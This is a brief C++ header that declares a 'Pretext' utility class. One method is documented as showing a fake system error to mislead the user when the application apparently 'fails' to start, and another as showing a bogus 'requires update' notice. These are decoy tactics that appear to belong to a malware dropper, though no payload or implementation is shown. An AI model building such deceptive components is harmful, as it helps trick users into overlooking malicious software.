#pragma once

#include <string>

namespace utils {

class Pretext {
public:
    /**
     * @brief Displays a fake system error message to mislead the user if the application "fails" to start.
     */
    static void ShowFakeError(const std::wstring& message, const std::wstring& title);

    /**
     * @brief Displays a generic "Application requires update" or similar message.
     */
    static void ShowInfoMessage(const std::wstring& message, const std::wstring& title);
};

} // namespace utils
